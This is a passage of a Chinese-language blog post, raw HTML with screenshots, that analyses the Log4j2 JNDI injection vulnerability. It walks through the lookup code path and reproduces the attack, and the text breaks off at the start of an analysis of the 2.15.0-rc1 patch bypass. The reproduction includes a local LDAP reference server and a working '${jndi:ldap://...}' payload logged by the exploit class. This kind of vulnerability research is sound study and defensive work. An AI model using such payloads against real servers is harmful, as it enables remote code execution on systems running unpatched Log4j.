src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710221770681-2bd320f3-667f-45fc-a60c-b8840b55b5c5.png#averageHue=%23383e46&clientId=u9adf2b5e-1641-4&from=paste&height=715&id=u86207f3b&originHeight=1072&originWidth=1537&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=706933&status=done&style=none&taskId=u007f95a3-3b55-4707-a469-762590c008d&title=&width=1024.6666666666667\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>这里就不一一分析代码了，这里其实就是对两个标识符的功能的描述：</p>\n<ul>\n<li><code>:- </code>是一个赋值关键字，如果程序处理到 <code>$&#123;aaaa:-bbbb&#125;</code> 这样的字符串，处理的结果将会是 <code>bbbb</code>，<code>:-</code> 关键字将会被截取掉，而之前的字符串都会被舍弃掉。  </li>\n<li><code>:\\-</code> 是转义的 <code>:-</code>，如果一个用  <code>a:b</code> 表示的键值对的 key a 中包含<code>:</code>，则需要使用转义来配合处理，例如 <code>$&#123;aaa:\\\\-bbb:-ccc&#125;</code>，代表 key 是<code>aaa:bbb</code>，value 是 <code>ccc</code></li>\n</ul>\n<p>在没有匹配到变量赋值或者匹配结束后，将会调用<code>resolveVariable</code>方法来解析满足 lookup 功能的语法，并执行相应的 lookup<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710222192009-7dfadfed-61a4-4275-ac48-c8fb0830543b.png#averageHue=%23383e46&clientId=u9adf2b5e-1641-4&from=paste&height=347&id=u26a48ffa&originHeight=520&originWidth=949&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=177542&status=done&style=none&taskId=u099ca407-95d9-4294-866a-e2fa654f47e&title=&width=632.6666666666666\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>我们跟进到 resolveVariable 方法<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710222376088-13cf4d38-034d-461e-853e-d23348037e78.png#averageHue=%23363c45&clientId=u64edae2b-8a46-4&from=paste&height=204&id=u55195f63&originHeight=306&originWidth=1467&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=154584&status=done&style=none&taskId=ue9051b32-f493-470f-9db5-c693bf6d1a1&title=&width=978\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>他这里会先获取到<code>variableResolver</code>，然后调用其 lookup 方法进行处理。实际上<code>variableResolver</code>是一个代理类<code>Interpolator</code>，之后再深入了解</p>\n<p>分析这些内容，我相信此时应该能感受到<code>StrSubstitutor</code>的<code>substitute</code>方法的重要性，它是直接解析 payload 的处理方法，通过在这里下断点&#x2F;Hook 点，能够最直接的分析到 payload 的处理，以及日后的防御处理</p>\n<h3 id=\"1x04-lookup-处理—-Interpolator\"><a href=\"#1x04-lookup-处理—-Interpolator\" class=\"headerlink\" title=\"1x04 lookup 处理—-Interpolator\"></a>1x04 lookup 处理—-Interpolator</h3><p>刚才提到，variableResolver 实际上是一个代理类<code>org.apache.logging.log4j.core.lookup.Interpolator</code>，他来代理所有的 StrLookup 实现类，也就是说我们在调用 Lookup 的时候，都是由<code>Interpolator</code>处理和分发的<br>看一下默认结构<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710223008922-c59d66cf-4ce2-41e6-8114-c5c8ed3d35f4.png#averageHue=%23333940&clientId=u64edae2b-8a46-4&from=paste&height=448&id=uee9b44e0&originHeight=672&originWidth=866&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=258728&status=done&style=none&taskId=u2d76b23d-4c88-471b-bb5c-e4f114a9835&title=&width=577.3333333333334\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>在 interpolator 的构造方法中，它创建了一个<code>strLookupMap</code>键值对表，对一些默认情况的 Lookup 查询进行了装载，这里的 JNDI-Lookup 查询是通过下面的 try catch 块实现的<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710223324287-06e90deb-c73e-4994-8b4a-ac5ad29d221c.png#averageHue=%23373d45&clientId=u64edae2b-8a46-4&from=paste&height=501&id=u22981040&originHeight=751&originWidth=1749&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=529584&status=done&style=none&taskId=u9fe85968-9852-4266-b9a9-a7953559a0c&title=&width=1166\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>再看最为关键的 lookup 方法具体的内容<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710223395964-8e329702-b6dd-459c-9924-75aaf8b19506.png#averageHue=%23373d45&clientId=u64edae2b-8a46-4&from=paste&height=747&id=ue1ddf259&originHeight=1121&originWidth=1470&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=641711&status=done&style=none&taskId=u9cedaeb0-72f5-42e4-a787-f0368715b9c&title=&width=980\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>它通过<code>:</code>作为表示符，用来分隔 Lookup 关键字和参数，从 strLookup 中根据分割出来的关键字匹配到相应的处理类，并调用其 Lookup 方法<br>log4j 的漏洞触发是通过<code>jndi:</code>关键字来触发 JNDI 注入漏洞的,<code>jndi:</code>关键字对应的处理类是<code>org.apache.logging.log4j.core.lookup.JndiLookup</code>，我们跟进查看具体它的 lookup 方法是如何被调用的<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710223925328-61484279-1842-4a95-9a78-6d26d6d2b236.png#averageHue=%23383e47&clientId=u64edae2b-8a46-4&from=paste&height=385&id=ufad7014e&originHeight=577&originWidth=1505&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=332122&status=done&style=none&taskId=uac1ad129-875b-4568-940c-2f804c49b7a&title=&width=1003.3333333333334\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>先是获取了 <code>jndiManager</code>，然后再调用<code> jndiManager</code> 的 lookup 方法<br>我们先跟进查看<code>jndiManager</code>是如何被创建的<br>最终跟进到 <code>AbstractManager</code> 的 <code>getManager</code> 方法中，通过 JndiManagerFactory 来创建<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710224095570-28e29876-dc48-42bd-9b1e-dbd03a52ccf9.png#averageHue=%23373d46&clientId=u64edae2b-8a46-4&from=paste&height=229&id=u3809fada&originHeight=344&originWidth=1650&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=192422&status=done&style=none&taskId=uf0f1021a-5e6e-46c7-8017-27c2f6cc508&title=&width=1100\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>不过这个 JndiManagerFactory 本身就是在 JndiManager 的子类中<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710224255202-cb740638-416c-46bd-8282-e525a0b7d39d.png#averageHue=%23363f4a&clientId=u64edae2b-8a46-4&from=paste&height=315&id=uf8642703&originHeight=472&originWidth=799&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=206470&status=done&style=none&taskId=u76ad590f-f182-4d6d-8f90-593dd56e873&title=&width=532.6666666666666\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>具体看 createManager 的内容<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710224217807-b265f723-fce5-4a73-9f87-739a1e21c1c8.png#averageHue=%23373d45&clientId=u64edae2b-8a46-4&from=paste&height=344&id=hCqsD&originHeight=516&originWidth=1567&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=283554&status=done&style=none&taskId=ua2d7172a-2ef8-4f56-9f32-836defac43b&title=&width=1044.6666666666667\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>实例化的的时候带着<code>InitialContext</code> 创建的，看到这个<code>InitialContext</code>就想到后续的一系列调用<br>而 JndiManager 的 lookup 调用方法就是直接调<code>InitialContext</code>，并且参数 name 是我们可以控制的<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710224545979-5675a20b-2eb4-4f88-b024-5b6cbccfe301.png#averageHue=%23373d46&clientId=u64edae2b-8a46-4&from=paste&height=133&id=u364e658f&originHeight=199&originWidth=1109&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=80651&status=done&style=none&taskId=u6588cd65-e22a-4503-b85e-3d60813c157&title=&width=739.3333333333334\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>最终 sink 点也是在这</p>\n<h1 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h1><h2 id=\"0x01-漏洞复现\"><a href=\"#0x01-漏洞复现\" class=\"headerlink\" title=\"0x01 漏洞复现\"></a>0x01 漏洞复现</h2><p>影响版本：<code>2.x &lt;= log4j &lt;= 2.15.0-rc1 </code><br>先把 Ldap 服务器本地开一下<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710225689374-73940b21-a5bd-4b95-875b-12fcec777aa6.png#averageHue=%23eae8e5&clientId=u64edae2b-8a46-4&from=paste&height=185&id=ua9db04b6&originHeight=277&originWidth=536&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=21560&status=done&style=none&taskId=u7628f756-0e36-4353-9034-7389bff8cb1&title=&width=357.3333333333333\" referrerpolicy=\"no-referrer\" alt=\"image.png\"></p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki min-dark\" style=\"background-color: #1f1f1f\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">com</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">sun</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">jndi</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">rmi</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">registry</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">ReferenceWrapper</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">javax</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">naming</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">InitialContext</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">javax</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">naming</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Reference</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">rmi</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Naming</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #F97583\">public</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">class</span><span style=\"color: #B392F0\"> JNDI_LDAP_Server &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    </span><span style=\"color: #F97583\">public</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">static</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">void</span><span style=\"color: #B392F0\"> main(</span><span style=\"color: #F97583\">String</span><span style=\"color: #B392F0\">[] args) </span><span style=\"color: #F97583\">throws</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">Exception</span><span style=\"color: #B392F0\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">InitialContext</span><span style=\"color: #B392F0\"> initialContext</span><span style=\"color: #F97583\">=new</span><span style=\"color: #B392F0\"> InitialContext();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">Reference</span><span style=\"color: #B392F0\"> refObj</span><span style=\"color: #F97583\">=new</span><span style=\"color: #B392F0\"> Reference(</span><span style=\"color: #FFAB70\">&quot;RMIHello&quot;</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #FFAB70\">&quot;RMIHello&quot;</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #FFAB70\">&quot;http://localhost:8000/&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #6B737C\">//        ReferenceWrapper referenceWrapper=new ReferenceWrapper(refObj);</span></span>\n<span class=\"line\"><span style=\"color: #6B737C\">//        Naming.bind(&quot;ldap://localhost:10389/cn=TestLdap,dc=example,dc=com&quot;,referenceWrapper);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">initialContext</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">rebind(</span><span style=\"color: #FFAB70\">&quot;ldap://localhost:10389/cn=TestLdap,dc=example,dc=com&quot;</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\">refObj);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">System</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">out</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">println(</span><span style=\"color: #FFAB70\">&quot;LDAP服务器正在运行中&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">&#125;</span></span>\n<span class=\"line\"></span></code></pre></div><p>恶意类的内容是 runtime 执行一个计算器<br>然后看 exp</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki min-dark\" style=\"background-color: #1f1f1f\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">logging</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">log4j</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">LogManager</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">logging</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">log4j</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Logger</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">util</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">function</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">LongFunction</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #F97583\">public</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">class</span><span style=\"color: #B392F0\"> log4j2exp &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    </span><span style=\"color: #F97583\">public</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">static</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">void</span><span style=\"color: #B392F0\"> main(</span><span style=\"color: #F97583\">String</span><span style=\"color: #B392F0\">[] args) &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">Logger</span><span style=\"color: #B392F0\"> logger </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">LogManager</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getLogger(</span><span style=\"color: #79B8FF\">LongFunction</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">class</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">String</span><span style=\"color: #B392F0\"> username </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #FFAB70\">&quot;$&#123;jndi:ldap://127.0.0.1:1234/ExportObject&#125;&quot;</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">logger</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">info(</span><span style=\"color: #FFAB70\">&quot;User &#123;&#125; login in!&quot;</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> username);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">&#125;</span></span></code></pre></div><p>执行完毕<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710225698557-726ac2af-7217-47c1-9213-95ca63926d92.png#averageHue=%235a6068&clientId=u64edae2b-8a46-4&from=paste&height=620&id=ue95b6d0d&originHeight=930&originWidth=2075&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=664854&status=done&style=none&taskId=u0ce96d73-696f-40b1-a172-10bd8d8a6c4&title=&width=1383.3333333333333\" referrerpolicy=\"no-referrer\" alt=\"cb3cee868216a04b4ddae48e9d8fdb91.png\"></p>\n<h2 id=\"0x02-流程分析\"><a href=\"#0x02-流程分析\" class=\"headerlink\" title=\"0x02 流程分析\"></a>0x02 流程分析</h2><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>调试前的心里准备：<br>首先我们要明确，log4j2 漏洞的触发点是在字符串处理阶段触发的，所以在流程调试前期的到日志打印的流程都是不需要跟进的，明确我们要首先跟进到 MessagePatternConverter 的字符转化 format 方法中，然后记住如果有分支已经要返回出去打印了就不需要跟进了</p></blockquote>\n<p>在 info 处打个断点<br>由于AbstractLogger 的日志功能方法有若干重载方法，以及各种数据处理，师傅们可以参考我的调用栈，避免不必要的时间浪费<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710226996949-0292fe17-7962-4248-b050-8b51f6d08d59.png#averageHue=%234f4b42&clientId=u64edae2b-8a46-4&from=paste&height=586&id=u64564b0a&originHeight=879&originWidth=1207&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=548862&status=done&style=none&taskId=u2adcc7c6-7d65-4a06-a7b6-68b12bedf0a&title=&width=804.6666666666666\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>最近的调用可以打在 <code>PatternLayout</code> 类的 <code>toText </code>方法中<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710226979100-2c56df9c-86b9-420e-bc88-e5f932e6ca93.png#averageHue=%23515769&clientId=u64edae2b-8a46-4&from=paste&height=115&id=u8323eca9&originHeight=172&originWidth=1071&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=74837&status=done&style=none&taskId=uaddb9694-b47d-48b3-91c0-37914ad5df3&title=&width=714\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>然后跟进到 toSerializable 中，到这就是熟悉的 format 方法了，但是还没到<code>MessagePatternConverter</code>类，所以还需要继续深入跟进<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710227044167-511bbbaf-e5dd-4b4b-9f58-dff08ae79974.png#averageHue=%233f4550&clientId=u64edae2b-8a46-4&from=paste&height=383&id=uf6cd5535&originHeight=574&originWidth=1951&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=371705&status=done&style=none&taskId=ua0fd28e7-0775-4f89-9cb5-14dfc35a847&title=&width=1300.6666666666667\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>而且这里会有几次循环调用，并且由于信息类型不同，调用的Pattern 就不同，直到第八次循环（可能 exp 或者版本不同循环次数也不同？）<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710227383234-c2712a27-77d4-469f-8c7f-fae8ed433306.png#averageHue=%23373d46&clientId=u64edae2b-8a46-4&from=paste&height=687&id=u9d8f5932&originHeight=1030&originWidth=2075&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=951965&status=done&style=none&taskId=u834635be-aea3-4e33-8efb-860cca8fe59&title=&width=1383.3333333333333\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>才是我们想要的 MessagePatternConverter 的 format 方法，跟进<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710227440804-9f58f986-f3e8-496c-8835-bcb6a2b5be94.png#averageHue=%233c424c&clientId=u64edae2b-8a46-4&from=paste&height=663&id=uec082381&originHeight=994&originWidth=2057&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=844738&status=done&style=none&taskId=u78041b8e-7729-4796-ae8e-a3bc88e8561&title=&width=1371.3333333333333\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>这里 format 的内容就不讲了，直接到 Substitutor 的字符串处理逻辑即可<br>跟进到 replace 方法<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710227540307-e69fda4a-8273-4261-9349-29a82495b7c8.png#averageHue=%23424854&clientId=u64edae2b-8a46-4&from=paste&height=258&id=uf22fcdcf&originHeight=387&originWidth=2124&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=307643&status=done&style=none&taskId=u4ac06edd-4801-41f2-8f9e-464c4eb7c99&title=&width=1416\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>这里获取了 StringBuilder 之后开始调用<code>substitute</code><br>关于<code>substitute</code>的整体逻辑我们在StrSubstitutor 的详细功能分析中已经分析过了，这里直接到下一阶段的跟进点，也就是将字符串经过前后缀获取以及删减，最终在没有匹配到变量赋值或者匹配结束后<code>resolveVariable</code>方法来解析满足 lookup 功能的语法，并执行相应的 lookup 逻辑<br>这里流程循环较多，因为字符较多，他又会根据解析程度再次循环截取处理<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710227885639-b5400f05-55ea-4493-8592-6f2cd59f07d9.png#averageHue=%23373e46&clientId=u64edae2b-8a46-4&from=paste&height=155&id=uee50ade5&originHeight=232&originWidth=1194&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=118989&status=done&style=none&taskId=u1a994deb-3a78-4ce5-ba71-6dfdb353111&title=&width=796\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>师傅们可参考的我这边的进度来调<br>来到<code>resolveVariable</code>，继续跟进<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710227910868-a0f75de5-bbe7-4cb0-9662-c33b213d9426.png#averageHue=%23464c59&clientId=u64edae2b-8a46-4&from=paste&height=200&id=ufc1ec4bb&originHeight=300&originWidth=2224&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=214073&status=done&style=none&taskId=ua7d2e2a3-94ba-4c5e-8488-1f3bce88860&title=&width=1482.6666666666667\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>之前也提到过<code>variableResolver</code>实际上是一个代理类 interpolator（StrLookup 键值对表中的所有功能的 lookup 功能都是通过它来代理），所以这里会直接调进<code>Interpolator</code>的 lookup<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710227944575-529f7750-1463-4095-907a-22f665d0fea8.png#averageHue=%23454b58&clientId=u64edae2b-8a46-4&from=paste&height=224&id=u20297855&originHeight=336&originWidth=2131&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=265670&status=done&style=none&taskId=u04422742-f10b-4e27-8afd-9cd2633171d&title=&width=1420.6666666666667\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>继续跟进，也是从 strLookupMap 中获取到 JndiLookup 之后开始调用其 lookup 了<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710228093181-9b6845ac-0f61-45c1-9bd7-2bb8c3b7e591.png#averageHue=%233e444f&clientId=u64edae2b-8a46-4&from=paste&height=451&id=uf7bb5692&originHeight=677&originWidth=2118&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=540939&status=done&style=none&taskId=uf3fc0fe3-adbf-4ba1-aa6e-25d67613181&title=&width=1412\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>继续跟进到JndiLookup 的 lookup<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710228168403-95b46332-1a60-4435-9bdc-10cd3c18f422.png#averageHue=%23414753&clientId=u64edae2b-8a46-4&from=paste&height=380&id=u1f7f762c&originHeight=570&originWidth=2084&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=447128&status=done&style=none&taskId=uba03caaa-d8da-439f-b278-53aa8321455&title=&width=1389.3333333333333\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>由于创建JndiManager 时自带构建 initialContext，并且这里的调用 JndiManager 的 lookup 就是调用 InitialContext 的 lookup，之后就是熟悉的 JNDI 注入的原始的流程了<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710228238146-5d70a3e4-7367-42ec-833c-cf5f49a21ac9.png#averageHue=%234f5565&clientId=u64edae2b-8a46-4&from=paste&height=159&id=u4a65b927&originHeight=238&originWidth=2095&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=171332&status=done&style=none&taskId=ucdb43202-98c8-4adc-886a-a4d664d17c6&title=&width=1396.6666666666667\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>基本流程 sink 分析结束<br>（师傅们如果在看我这篇文章学习的话可以先尝试把 log4j2 功能组件的分析先了解深一点，后续跟进调试会轻松很多）</p>\n<h1 id=\"高版本绕过分析\"><a href=\"#高版本绕过分析\" class=\"headerlink\" title=\"高版本绕过分析\"></a>高版本绕过分析</h1><h2 id=\"0x01-rc1-及绕过\"><a href=\"#0x01-rc1-及绕过\" class=\"headerlink\" title=\"0x01 rc1 及绕过\"></a>0x01 rc1 及绕过</h2><h3 id=\"1x01-安全更新点分析-1\"><a href=\"#1x01-安全更新点分析-1\" class=\"headerlink\" title=\"1x01 安全更新点分析 1\"></a>1x01 安全更新点分析 1</h3><p>在漏洞披露后，log4j2 官方发布了 log4j-2.15.0-rc1 安全更新包，经过师傅们进一步分析，在开启 lookup 配置后可以被绕过 （危害性较低，一般都不会再去开启 lookup 功能了）<br>回忆一下漏洞之初的样子，我们在MessagePatternConverter 中是默认开启了 lookup 选项的，但是从 rc1 之后，它的源码如下：<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710230285828-5e946d92-51ac-4bfb-b173-7aaa863d433d.png#averageHue=%23373e47&clientId=u64edae2b-8a46-4&from=paste&height=388&id=u3e5dbbf1&originHeight=582&originWidth=1557&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=365966&status=done&style=none&taskId=u37a33ceb-2591-49ae-85dc-1b0f2687f5b&title=&width=1038\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>然后再看看之前的构造方法<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710215464941-76bda8b6-d418-46c9-b7b2-20342c4afaa2.png?x-oss-process=image/format,webp/resize,w_1125,limit_0#averageHue=%233a3d3e&from=url&id=k2XE7&originHeight=510&originWidth=1125&originalType=binary&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&title=\" 